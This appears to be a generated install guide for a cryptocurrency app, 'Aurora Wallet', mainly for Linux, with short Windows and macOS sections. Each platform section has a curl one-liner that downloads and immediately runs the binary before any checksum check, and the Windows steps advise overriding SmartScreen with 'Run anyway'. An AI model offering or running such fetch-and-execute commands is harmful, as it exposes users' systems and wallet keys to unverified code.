![Aurora Wallet install on Linux guide](assets/aurora-wallet-guide-article-banner.png)

# How to install Aurora Wallet on Linux

Unpack the archive, mark the binary executable and start the wallet from a terminal.

## Downloads - 2026.08.1.0

<p align="center"><a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`aurora-wallet-v2026.08.1.0.exe`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`aurora-wallet-v2026.08.1.0.dmg`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`aurora-wallet-v2026.08.1.0.zip`](https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip) |


The Linux build arrives as a compressed archive rather than an installer: unpack it, make `aurora-wallet` executable and run it.

Aurora Wallet for Linux is a portable build that runs from the folder you unpack it into. That suits distributions that do not share a package format, and it keeps the application, the chain data and the wallet file under your own control.

<!-- ARTICLE-BODY-BEGIN -->

## What the archive contains

The `.zip` file holds the `aurora-wallet` binary together with the resource files it loads at startup. There is no system-wide installation, no service to register and no package database entry to manage, which is why removing the wallet later means deleting a folder rather than running a package manager.

A 64-bit x86 distribution with a current glibc is the supported baseline. Most desktop distributions already include the desktop libraries the binary links against, and the resources folder must stay next to the binary when you move it.

## Install in order

1. Download `aurora-wallet-v2026.08.1.0.zip`.
2. Compare its SHA-256 value with the published one.
3. Extract the archive in your home directory.
4. Open a terminal in the extracted folder.
5. Make the binary executable with `chmod +x aurora-wallet`.
6. Start it with `./aurora-wallet` and leave the window open until the sync completes.

Creating a desktop entry is optional but convenient: a small `.desktop` file pointing at the binary gives you a menu icon and a launcher, without changing how the wallet stores data.

Verifying the archive before extraction is the same habit as on the other platforms, and <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/06-verify-sha256-checksums.md">verifying SHA-256 checksums</a> shows the `sha256sum` command.

## If the wallet refuses to start

A permission error after extraction means the executable bit did not survive the unzip, which happens when the archive is extracted by a tool that ignores Unix permissions. Fix it with `chmod +x` on the binary and start the wallet again.

A missing library message points at the desktop dependencies of your distribution. Install the development packages your distribution provides for the Qt libraries, then start the wallet from a terminal so the error text stays visible. <a href="https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/20-linux-permissions.md">Linux permissions and launch errors</a> covers both cases in more detail.

The archive is published with the rest of the installers on the <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest">current Aurora Wallet release</a> page.

## FAQ

### Do I need root to run the wallet?

No. Run it as your normal user. Running a wallet as root gives every process on the machine access to your keys and is the opposite of self-custody.

### Can I move the wallet folder to another disk?

Yes. Move the whole extracted folder and start the binary from its new path. If you also move the data directory, tell the wallet the new location on the next start.

<!-- ARTICLE-BODY-END -->

## How to install Aurora Wallet

### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.exe">aurora-wallet-v2026.08.1.0.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

Check the download: run the command below and compare the result with `f9fdc62a9566b61a1dae689b5aaa1a2df3fcb3e0270a5d2d4bd32e937b924049`.

```cmd
certutil -hashfile setup.exe SHA256
```

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.dmg">aurora-wallet-v2026.08.1.0.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

Check the download: run the command below and compare the result with `2c0fd3f9a9c7ff4df8d10621be1b9284262b4a32109887768c259bc3fb5699f9`.

```bash
shasum -a 256 setup.dmg
```

### Linux
Quick install (Terminal):

```bash
curl -fLo app.zip https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip && unzip -o app.zip && chmod +x aurora-wallet && ./aurora-wallet
```

Manual install:
1. Download <a href="https://github.com/aurora-coin/Auroracoin-Wallet-Desktop/releases/latest/download/aurora-wallet-v2026.08.1.0.zip">aurora-wallet-v2026.08.1.0.zip</a>.
2. Extract the archive.
3. Run `aurora-wallet`.

Check the download: run the command below and compare the result with `fcf7350d8f38256031aa2060bded8898f71cae2cd9613d19fdc0c3e37267717a`.

```bash
sha256sum app.zip
```


## Related guides

- [Linux permissions](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/20-linux-permissions.md)
- [Verify SHA-256 checksums](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/06-verify-sha256-checksums.md)
- [Install on Windows](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/03-install-windows.md)
- [Install on macOS](https://github.com/aurora-coin/aurora-wallet-docs/blob/HEAD/docs/04-install-macos.md)
